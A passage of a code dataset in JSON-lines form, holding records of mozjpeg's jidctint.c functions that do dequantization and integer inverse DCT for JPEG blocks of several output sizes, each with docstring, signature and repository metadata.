+ MULTIPLY(z3, FIX(2.115825087)); /* c4+c6 */\n    tmp23 += tmp25 - MULTIPLY(z1, FIX(1.513598477)); /* c6+c8 */\n    tmp24 += tmp25;\n    tmp22 = tmp24 - MULTIPLY(z3, FIX(0.788749120));  /* c8+c10 */\n    tmp24 += MULTIPLY(z2, FIX(1.944413522)) -        /* c2+c8 */\n             MULTIPLY(z1, FIX(1.390975730));         /* c4+c10 */\n    tmp25 = tmp10 - MULTIPLY(z4, FIX(1.414213562));  /* c0 */\n\n    /* Odd part */\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 1], quantptr[DCTSIZE * 1]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 3], quantptr[DCTSIZE * 3]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 5], quantptr[DCTSIZE * 5]);\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 7], quantptr[DCTSIZE * 7]);\n\n    tmp11 = z1 + z2;\n    tmp14 = MULTIPLY(tmp11 + z3 + z4, FIX(0.398430003)); /* c9 */\n    tmp11 = MULTIPLY(tmp11, FIX(0.887983902));           /* c3-c9 */\n    tmp12 = MULTIPLY(z1 + z3, FIX(0.670361295));         /* c5-c9 */\n    tmp13 = tmp14 + MULTIPLY(z1 + z4, FIX(0.366151574)); /* c7-c9 */\n    tmp10 = tmp11 + tmp12 + tmp13 -\n            MULTIPLY(z1, FIX(0.923107866));              /* c7+c5+c3-c1-2*c9 */\n    z1    = tmp14 - MULTIPLY(z2 + z3, FIX(1.163011579)); /* c7+c9 */\n    tmp11 += z1 + MULTIPLY(z2, FIX(2.073276588));        /* c1+c7+3*c9-c3 */\n    tmp12 += z1 - MULTIPLY(z3, FIX(1.192193623));        /* c3+c5-c7-c9 */\n    z1    = MULTIPLY(z2 + z4, -FIX(1.798248910));        /* -(c1+c9) */\n    tmp11 += z1;\n    tmp13 += z1 + MULTIPLY(z4, FIX(2.102458632));        /* c1+c5+c9-c7 */\n    tmp14 += MULTIPLY(z2, -FIX(1.467221301)) +           /* -(c5+c9) */\n             MULTIPLY(z3, FIX(1.001388905)) -            /* c1-c9 */\n             MULTIPLY(z4, FIX(1.684843907));             /* c3+c9 */\n\n    /* Final output stage */\n\n    wsptr[8 * 0]  = (int)RIGHT_SHIFT(tmp20 + tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 10] = (int)RIGHT_SHIFT(tmp20 - tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 1]  = (int)RIGHT_SHIFT(tmp21 + tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 9]  = (int)RIGHT_SHIFT(tmp21 - tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 2]  = (int)RIGHT_SHIFT(tmp22 + tmp12, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 8]  = (int)RIGHT_SHIFT(tmp22 - tmp12, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 3]  = (int)RIGHT_SHIFT(tmp23 + tmp13, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 7]  = (int)RIGHT_SHIFT(tmp23 - tmp13, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 4]  = (int)RIGHT_SHIFT(tmp24 + tmp14, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 6]  = (int)RIGHT_SHIFT(tmp24 - tmp14, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 5]  = (int)RIGHT_SHIFT(tmp25, CONST_BITS - PASS1_BITS);\n  }\n\n  /* Pass 2: process 11 rows from work array, store into output array. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < 11; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n\n    /* Even part */\n\n    /* Add fudge factor here for final descale. */\n    tmp10 = (JLONG)wsptr[0] + (ONE << (PASS1_BITS + 2));\n    tmp10 = LEFT_SHIFT(tmp10, CONST_BITS);\n\n    z1 = (JLONG)wsptr[2];\n    z2 = (JLONG)wsptr[4];\n    z3 = (JLONG)wsptr[6];\n\n    tmp20 = MULTIPLY(z2 - z3, FIX(2.546640132));     /* c2+c4 */\n    tmp23 = MULTIPLY(z2 - z1, FIX(0.430815045));     /* c2-c6 */\n    z4 = z1 + z3;\n    tmp24 = MULTIPLY(z4, -FIX(1.155664402));         /* -(c2-c10) */\n    z4 -= z2;\n    tmp25 = tmp10 + MULTIPLY(z4, FIX(1.356927976));  /* c2 */\n    tmp21 = tmp20 + tmp23 + tmp25 -\n            MULTIPLY(z2, FIX(1.821790775));          /* c2+c4+c10-c6 */\n    tmp20 += tmp25 + MULTIPLY(z3, FIX(2.115825087)); /* c4+c6 */\n    tmp23 += tmp25 - MULTIPLY(z1, FIX(1.513598477)); /* c6+c8 */\n    tmp24 += tmp25;\n    tmp22 = tmp24 - MULTIPLY(z3, FIX(0.788749120));  /* c8+c10 */\n    tmp24 += MULTIPLY(z2, FIX(1.944413522)) -        /* c2+c8 */\n             MULTIPLY(z1, FIX(1.390975730));         /* c4+c10 */\n    tmp25 = tmp10 - MULTIPLY(z4, FIX(1.414213562));  /* c0 */\n\n    /* Odd part */\n\n    z1 = (JLONG)wsptr[1];\n    z2 = (JLONG)wsptr[3];\n    z3 = (JLONG)wsptr[5];\n    z4 = (JLONG)wsptr[7];\n\n    tmp11 = z1 + z2;\n    tmp14 = MULTIPLY(tmp11 + z3 + z4, FIX(0.398430003)); /* c9 */\n    tmp11 = MULTIPLY(tmp11, FIX(0.887983902));           /* c3-c9 */\n    tmp12 = MULTIPLY(z1 + z3, FIX(0.670361295));         /* c5-c9 */\n    tmp13 = tmp14 + MULTIPLY(z1 + z4, FIX(0.366151574)); /* c7-c9 */\n    tmp10 = tmp11 + tmp12 + tmp13 -\n            MULTIPLY(z1, FIX(0.923107866));              /* c7+c5+c3-c1-2*c9 */\n    z1    = tmp14 - MULTIPLY(z2 + z3, FIX(1.163011579)); /* c7+c9 */\n    tmp11 += z1 + MULTIPLY(z2, FIX(2.073276588));        /* c1+c7+3*c9-c3 */\n    tmp12 += z1 - MULTIPLY(z3, FIX(1.192193623));        /* c3+c5-c7-c9 */\n    z1    = MULTIPLY(z2 + z4, -FIX(1.798248910));        /* -(c1+c9) */\n    tmp11 += z1;\n    tmp13 += z1 + MULTIPLY(z4, FIX(2.102458632));        /* c1+c5+c9-c7 */\n    tmp14 += MULTIPLY(z2, -FIX(1.467221301)) +           /* -(c5+c9) */\n             MULTIPLY(z3, FIX(1.001388905)) -            /* c1-c9 */\n             MULTIPLY(z4, FIX(1.684843907));             /* c3+c9 */\n\n    /* Final output stage */\n\n    outptr[0]  = range_limit[(int)RIGHT_SHIFT(tmp20 + tmp10,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[10] = range_limit[(int)RIGHT_SHIFT(tmp20 - tmp10,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[1]  = range_limit[(int)RIGHT_SHIFT(tmp21 + tmp11,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[9]  = range_limit[(int)RIGHT_SHIFT(tmp21 - tmp11,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[2]  = range_limit[(int)RIGHT_SHIFT(tmp22 + tmp12,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[8]  = range_limit[(int)RIGHT_SHIFT(tmp22 - tmp12,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[3]  = range_limit[(int)RIGHT_SHIFT(tmp23 + tmp13,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[7]  = range_limit[(int)RIGHT_SHIFT(tmp23 - tmp13,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[4]  = range_limit[(int)RIGHT_SHIFT(tmp24 + tmp14,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[6]  = range_limit[(int)RIGHT_SHIFT(tmp24 - tmp14,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[5]  = range_limit[(int)RIGHT_SHIFT(tmp25,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n\n    wsptr += 8;         /* advance pointer to next row */\n  }\n}", "path": "mozjpeg/jidctint.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients,\n * producing a 15x15 output block.\n *\n * Optimized algorithm with 22 multiplications in the 1-D kernel.\n * cK represents sqrt(2) * cos(K*pi/30).\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_15x15(j_decompress_ptr cinfo, jpeg_component_info *compptr,\n                JCOEFPTR coef_block, JSAMPARRAY output_buf,\n                JDIMENSION output_col)", "code": "{\n  JLONG tmp10, tmp11, tmp12, tmp13, tmp14, tmp15, tmp16;\n  JLONG tmp20, tmp21, tmp22, tmp23, tmp24, tmp25, tmp26, tmp27;\n  JLONG z1, z2, z3, z4;\n  JCOEFPTR inptr;\n  ISLOW_MULT_TYPE *quantptr;\n  int *wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[8 * 15];        /* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (ISLOW_MULT_TYPE *)compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = 0; ctr < 8; ctr++, inptr++, quantptr++, wsptr++) {\n    /* Even part */\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 0], quantptr[DCTSIZE * 0]);\n    z1 = LEFT_SHIFT(z1, CONST_BITS);\n    /* Add fudge factor here for final descale. */\n    z1 += ONE << (CONST_BITS - PASS1_BITS - 1);\n\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 2], quantptr[DCTSIZE * 2]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 4], quantptr[DCTSIZE * 4]);\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 6], quantptr[DCTSIZE * 6]);\n\n    tmp10 = MULTIPLY(z4, FIX(0.437016024)); /* c12 */\n    tmp11 = MULTIPLY(z4, FIX(1.144122806)); /* c6 */\n\n    tmp12 = z1 - tmp10;\n    tmp13 = z1 + tmp11;\n    z1 -= LEFT_SHIFT(tmp11 - tmp10, 1);     /* c0 = (c6-c12)*2 */\n\n    z4 = z2 - z3;\n    z3 += z2;\n    tmp10 = MULTIPLY(z3, FIX(1.337628990)); /* (c2+c4)/2 */\n    tmp11 = MULTIPLY(z4, FIX(0.045680613)); /* (c2-c4)/2 */\n    z2 = MULTIPLY(z2, FIX(1.439773946));    /* c4+c14 */\n\n    tmp20 = tmp13 + tmp10 + tmp11;\n    tmp23 = tmp12 - tmp10 + tmp11 + z2;\n\n    tmp10 = MULTIPLY(z3, FIX(0.547059574)); /* (c8+c14)/2 */\n    tmp11 = MULTIPLY(z4, FIX(0.399234004)); /* (c8-c14)/2 */\n\n    tmp25 = tmp13 - tmp10 - tmp11;\n    tmp26 = tmp12 + tmp10 - tmp11 - z2;\n\n    tmp10 = MULTIPLY(z3, FIX(0.790569415)); /* (c6+c12)/2 */\n    tmp11 = MULTIPLY(z4, FIX(0.353553391)); /* (c6-c12)/2 */\n\n    tmp21 = tmp12 + tmp10 + tmp11;\n    tmp24 = tmp13 - tmp10 + tmp11;\n    tmp11 += tmp11;\n    tmp22 = z1 + tmp11;                     /* c10 = c6-c12 */\n    tmp27 = z1 - tmp11 - tmp11;             /* c0 = (c6-c12)*2 */\n\n    /* Odd part */\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 1], quantptr[DCTSIZE * 1]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 3], quantptr[DCTSIZE * 3]);\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 5], quantptr[DCTSIZE * 5]);\n    z3 = MULTIPLY(z4, FIX(1.224744871));                    /* c5 */\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 7], quantptr[DCTSIZE * 7]);\n\n    tmp13 = z2 - z4;\n    tmp15 = MULTIPLY(z1 + tmp13, FIX(0.831253876));         /* c9 */\n    tmp11 = tmp15 + MULTIPLY(z1, FIX(0.513743148));         /* c3-c9 */\n    tmp14 = tmp15 - MULTIPLY(tmp13, FIX(2.176250899));      /* c3+c9 */\n\n    tmp13 = MULTIPLY(z2, -FIX(0.831253876));                /* -c9 */\n    tmp15 = MULTIPLY(z2, -FIX(1.344997024));                /* -c3 */\n    z2 = z1 - z4;\n    tmp12 = z3 + MULTIPLY(z2, FIX(1.406466353));            /* c1 */\n\n    tmp10 = tmp12 + MULTIPLY(z4, FIX(2.457431844)) - tmp15; /* c1+c7 */\n    tmp16 = tmp12 - MULTIPLY(z1, FIX(1.112434820)) + tmp13; /* c1-c13 */\n    tmp12 = MULTIPLY(z2, FIX(1.224744871)) - z3;            /* c5 */\n    z2 = MULTIPLY(z1 + z4, FIX(0.575212477));               /* c11 */\n    tmp13 += z2 + MULTIPLY(z1, FIX(0.475753014)) - z3;      /* c7-c11 */\n    tmp15 += z2 - MULTIPLY(z4, FIX(0.869244010)) + z3;      /* c11+c13 */\n\n    /* Final output stage */\n\n    wsptr[8 * 0]  = (int)RIGHT_SHIFT(tmp20 + tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 14] = (int)RIGHT_SHIFT(tmp20 - tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 1]  = (int)RIGHT_SHIFT(tmp21 + tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 13] = (int)RIGHT_SHIFT(tmp21 - tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 2]  = (int)RIGHT_SHIFT(tmp22 + tmp12, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 12] = (int)RIGHT_SHIFT(tmp22 - tmp12, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 3]  = (int)RIGHT_SHIFT(tmp23 + tmp13, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 11] = (int)RIGHT_SHIFT(tmp23 - tmp13, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 4]  = (int)RIGHT_SHIFT(tmp24 + tmp14, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 10] = (int)RIGHT_SHIFT(tmp24 - tmp14, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 5]  = (int)RIGHT_SHIFT(tmp25 + tmp15, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 9]  = (int)RIGHT_SHIFT(tmp25 - tmp15, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 6]  = (int)RIGHT_SHIFT(tmp26 + tmp16, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 8]  = (int)RIGHT_SHIFT(tmp26 - tmp16, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 7]  = (int)RIGHT_SHIFT(tmp27, CONST_BITS - PASS1_BITS);\n  }\n\n  /* Pass 2: process 15 rows from work array, store into output array. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < 15; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n\n    /* Even part */\n\n    /* Add fudge factor here for final descale. */\n    z1 = (JLONG)wsptr[0] + (ONE << (PASS1_BITS + 2));\n    z1 = LEFT_SHIFT(z1, CONST_BITS);\n\n    z2 = (JLONG)wsptr[2];\n    z3 = (JLONG)wsptr[4];\n    z4 = (JLONG)wsptr[6];\n\n    tmp10 = MULTIPLY(z4, FIX(0.437016024)); /* c12 */\n    tmp11 = MULTIPLY(z4, FIX(1.144122806)); /* c6 */\n\n    tmp12 = z1 - tmp10;\n    tmp13 = z1 + tmp11;\n    z1 -= LEFT_SHIFT(tmp11 - tmp10, 1);     /* c0 = (c6-c12)*2 */\n\n    z4 = z2 - z3;\n    z3 += z2;\n    tmp10 = MULTIPLY(z3, FIX(1.337628990)); /* (c2+c4)/2 */\n    tmp11 = MULTIPLY(z4, FIX(0.045680613)); /* (c2-c4)/2 */\n    z2 = MULTIPLY(z2, FIX(1.439773946));    /* c4+c14 */\n\n    tmp20 = tmp13 + tmp10 + tmp11;\n    tmp23 = tmp12 - tmp10 + tmp11 + z2;\n\n    tmp10 = MULTIPLY(z3, FIX(0.547059574)); /* (c8+c14)/2 */\n    tmp11 = MULTIPLY(z4, FIX(0.399234004)); /* (c8-c14)/2 */\n\n    tmp25 = tmp13 - tmp10 - tmp11;\n    tmp26 = tmp12 + tmp10 - tmp11 - z2;\n\n    tmp10 = MULTIPLY(z3, FIX(0.790569415)); /* (c6+c12)/2 */\n    tmp11 = MULTIPLY(z4, FIX(0.353553391)); /* (c6-c12)/2 */\n\n    tmp21 = tmp12 + tmp10 + tmp11;\n    tmp24 = tmp13 - tmp10 + tmp11;\n    tmp11 += tmp11;\n    tmp22 = z1 + tmp11;                     /* c10 = c6-c12 */\n    tmp27 = z1 - tmp11 - tmp11;             /* c0 = (c6-c12)*2 */\n\n    /* Odd part */\n\n    z1 = (JLONG)wsptr[1];\n    z2 = (JLONG)wsptr[3];\n    z4 = (JLONG)wsptr[5];\n    z3 = MULTIPLY(z4, FIX(1.224744871));                    /* c5 */\n    z4 = (JLONG)wsptr[7];\n\n    tmp13 = z2 - z4;\n    tmp15 = MULTIPLY(z1 + tmp13, FIX(0.831253876));         /* c9 */\n    tmp11 = tmp15 + MULTIPLY(z1, FIX(0.513743148));         /* c3-c9 */\n    tmp14 = tmp15 - MULTIPLY(tmp13, FIX(2.176250899));      /* c3+c9 */\n\n    tmp13 = MULTIPLY(z2, -FIX(0.831253876));                /* -c9 */\n    tmp15 = MULTIPLY(z2, -FIX(1.344997024));                /* -c3 */\n    z2 = z1 - z4;\n    tmp12 = z3 + MULTIPLY(z2, FIX(1.406466353));            /* c1 */\n\n    tmp10 = tmp12 + MULTIPLY(z4, FIX(2.457431844)) - tmp15; /* c1+c7 */\n    tmp16 = tmp12 - MULTIPLY(z1, FIX(1.112434820)) + tmp13; /* c1-c13 */\n    tmp12 = MULTIPLY(z2, FIX(1.224744871)) - z3;            /* c5 */\n    z2 = MULTIPLY(z1 + z4, FIX(0.575212477));               /* c11 */\n    tmp13 += z2 + MULTIPLY(z1, FIX(0.475753014)) - z3;      /* c7-c11 */\n    tmp15 += z2 - MULTIPLY(z4, FIX(0.869244010)) + z3;      /* c11+c13 */\n\n    /* Final output stage */\n\n    outptr[0]  = range_limit[(int)RIGHT_SHIFT(tmp20 + tmp10,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[14] = range_limit[(int)RIGHT_SHIFT(tmp20 - tmp10,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[1]  = range_limit[(int)RIGHT_SHIFT(tmp21 + tmp11,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[13] = range_limit[(int)RIGHT_SHIFT(tmp21 - tmp11,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[2]  = range_limit[(int)RIGHT_SHIFT(tmp22 + tmp12,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[12] = range_limit[(int)RIGHT_SHIFT(tmp22 - tmp12,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[3]  = range_limit[(int)RIGHT_SHIFT(tmp23 + tmp13,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[11] = range_limit[(int)RIGHT_SHIFT(tmp23 - tmp13,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[4]  = range_limit[(int)RIGHT_SHIFT(tmp24 + tmp14,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[10] = range_limit[(int)RIGHT_SHIFT(tmp24 - tmp14,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[5]  = range_limit[(int)RIGHT_SHIFT(tmp25 + tmp15,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[9]  = range_limit[(int)RIGHT_SHIFT(tmp25 - tmp15,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[6]  = range_limit[(int)RIGHT_SHIFT(tmp26 + tmp16,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[8]  = range_limit[(int)RIGHT_SHIFT(tmp26 - tmp16,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[7]  = range_limit[(int)RIGHT_SHIFT(tmp27,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n\n    wsptr += 8;         /* advance pointer to next row */\n  }\n}", "path": "mozjpeg/jidctint.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients,\n * producing a reduced-size 3x3 output block.\n *\n * Optimized algorithm with 2 multiplications in the 1-D kernel.\n * cK represents sqrt(2) * cos(K*pi/6).\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_3x3(j_decompress_ptr cinfo, jpeg_component_info *compptr,\n              JCOEFPTR coef_block, JSAMPARRAY output_buf,\n              JDIMENSION output_col)", "code": "{\n  JLONG tmp0, tmp2, tmp10, tmp12;\n  JCOEFPTR inptr;\n  ISLOW_MULT_TYPE *quantptr;\n  int *wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[3 * 3];         /* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (ISLOW_MULT_TYPE *)compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = 0; ctr < 3; ctr++, inptr++, quantptr++, wsptr++) {\n    /* Even part */\n\n    tmp0 = DEQUANTIZE(inptr[DCTSIZE * 0], quantptr[DCTSIZE * 0]);\n    tmp0 = LEFT_SHIFT(tmp0, CONST_BITS);\n    /* Add fudge factor here for final descale. */\n    tmp0 += ONE << (CONST_BITS - PASS1_BITS - 1);\n    tmp2 = DEQUANTIZE(inptr[DCTSIZE * 2], quantptr[DCTSIZE * 2]);\n    tmp12 = MULTIPLY(tmp2, FIX(0.707106781)); /* c2 */\n    tmp10 = tmp0 + tmp12;\n    tmp2 = tmp0 - tmp12 - tmp12;\n\n    /* Odd part */\n\n    tmp12 = DEQUANTIZE(inptr[DCTSIZE * 1], quantptr[DCTSIZE * 1]);\n    tmp0 = MULTIPLY(tmp12, FIX(1.224744871)); /* c1 */\n\n    /* Final output stage */\n\n    wsptr[3 * 0] = (int)RIGHT_SHIFT(tmp10 + tmp0, CONST_BITS - PASS1_BITS);\n    wsptr[3 * 2] = (int)RIGHT_SHIFT(tmp10 - tmp0, CONST_BITS - PASS1_BITS);\n    wsptr[3 * 1] = (int)RIGHT_SHIFT(tmp2, CONST_BITS - PASS1_BITS);\n  }\n\n  /* Pass 2: process 3 rows from work array, store into output array. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < 3; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n\n    /* Even part */\n\n    /* Add fudge factor here for final descale. */\n    tmp0 = (JLONG)wsptr[0] + (ONE << (PASS1_BITS + 2));\n    tmp0 = LEFT_SHIFT(tmp0, CONST_BITS);\n    tmp2 = (JLONG)wsptr[2];\n    tmp12 = MULTIPLY(tmp2, FIX(0.707106781)); /* c2 */\n    tmp10 = tmp0 + tmp12;\n    tmp2 = tmp0 - tmp12 - tmp12;\n\n    /* Odd part */\n\n    tmp12 = (JLONG)wsptr[1];\n    tmp0 = MULTIPLY(tmp12, FIX(1.224744871)); /* c1 */\n\n    /* Final output stage */\n\n    outptr[0] = range_limit[(int)RIGHT_SHIFT(tmp10 + tmp0,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[2] = range_limit[(int)RIGHT_SHIFT(tmp10 - tmp0,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[1] = range_limit[(int)RIGHT_SHIFT(tmp2,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n\n    wsptr += 3;         /* advance pointer to next row */\n  }\n}", "path": "mozjpeg/jidctint.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients,\n * producing a 16x16 output block.\n *\n * Optimized algorithm with 28 multiplications in the 1-D kernel.\n * cK represents sqrt(2) * cos(K*pi/32).\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_16x16(j_decompress_ptr cinfo, jpeg_component_info *compptr,\n                JCOEFPTR coef_block, JSAMPARRAY output_buf,\n                JDIMENSION output_col)", "code": "{\n  JLONG tmp0, tmp1, tmp2, tmp3, tmp10, tmp11, tmp12, tmp13;\n  JLONG tmp20, tmp21, tmp22, tmp23, tmp24, tmp25, tmp26, tmp27;\n  JLONG z1, z2, z3, z4;\n  JCOEFPTR inptr;\n  ISLOW_MULT_TYPE *quantptr;\n  int *wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[8 * 16];        /* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (ISLOW_MULT_TYPE *)compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = 0; ctr < 8; ctr++, inptr++, quantptr++, wsptr++) {\n    /* Even part */\n\n    tmp0 = DEQUANTIZE(inptr[DCTSIZE * 0], quantptr[DCTSIZE * 0]);\n    tmp0 = LEFT_SHIFT(tmp0, CONST_BITS);\n    /* Add fudge factor here for final descale. */\n    tmp0 += ONE << (CONST_BITS - PASS1_BITS - 1);\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 4], quantptr[DCTSIZE * 4]);\n    tmp1 = MULTIPLY(z1, FIX(1.306562965));      /* c4[16] = c2[8] */\n    tmp2 = MULTIPLY(z1, FIX_0_541196100);       /* c12[16] = c6[8] */\n\n    tmp10 = tmp0 + tmp1;\n    tmp11 = tmp0 - tmp1;\n    tmp12 = tmp0 + tmp2;\n    tmp13 = tmp0 - tmp2;\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 2], quantptr[DCTSIZE * 2]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 6], quantptr[DCTSIZE * 6]);\n    z3 = z1 - z2;\n    z4 = MULTIPLY(z3, FIX(0.275899379));        /* c14[16] = c7[8] */\n    z3 = MULTIPLY(z3, FIX(1.387039845));        /* c2[16] = c1[8] */\n\n    tmp0 = z3 + MULTIPLY(z2, FIX_2_562915447);  /* (c6+c2)[16] = (c3+c1)[8] */\n    tmp1 = z4 + MULTIPLY(z1, FIX_0_899976223);  /* (c6-c14)[16] = (c3-c7)[8] */\n    tmp2 = z3 - MULTIPLY(z1, FIX(0.601344887)); /* (c2-c10)[16] = (c1-c5)[8] */\n    tmp3 = z4 - MULTIPLY(z2, FIX(0.509795579)); /* (c10-c14)[16] = (c5-c7)[8] */\n\n    tmp20 = tmp10 + tmp0;\n    tmp27 = tmp10 - tmp0;\n    tmp21 = tmp12 + tmp1;\n    tmp26 = tmp12 - tmp1;\n    tmp22 = tmp13 + tmp2;\n    tmp25 = tmp13 - tmp2;\n    tmp23 = tmp11 + tmp3;\n    tmp24 = tmp11 - tmp3;\n\n    /* Odd part */\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 1], quantptr[DCTSIZE * 1]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 3], quantptr[DCTSIZE * 3]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 5], quantptr[DCTSIZE * 5]);\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 7], quantptr[DCTSIZE * 7]);\n\n    tmp11 = z1 + z3;\n\n    tmp1  = MULTIPLY(z1 + z2, FIX(1.353318001));   /* c3 */\n    tmp2  = MULTIPLY(tmp11,   FIX(1.247225013));   /* c5 */\n    tmp3  = MULTIPLY(z1 + z4, FIX(1.093201867));   /* c7 */\n    tmp10 = MULTIPLY(z1 - z4, FIX(0.897167586));   /* c9 */\n    tmp11 = MULTIPLY(tmp11,   FIX(0.666655658));   /* c11 */\n    tmp12 = MULTIPLY(z1 - z2, FIX(0.410524528));   /* c13 */\n    tmp0  = tmp1 + tmp2 + tmp3 -\n            MULTIPLY(z1, FIX(2.286341144));        /* c7+c5+c3-c1 */\n    tmp13 = tmp10 + tmp11 + tmp12 -\n            MULTIPLY(z1, FIX(1.835730603));        /* c9+c11+c13-c15 */\n    z1    = MULTIPLY(z2 + z3, FIX(0.138617169));   /* c15 */\n    tmp1  += z1 + MULTIPLY(z2, FIX(0.071888074));  /* c9+c11-c3-c15 */\n    tmp2  += z1 - MULTIPLY(z3, FIX(1.125726048));  /* c5+c7+c15-c3 */\n    z1    = MULTIPLY(z3 - z2, FIX(1.407403738));   /* c1 */\n    tmp11 += z1 - MULTIPLY(z3, FIX(0.766367282));  /* c1+c11-c9-c13 */\n    tmp12 += z1 + MULTIPLY(z2, 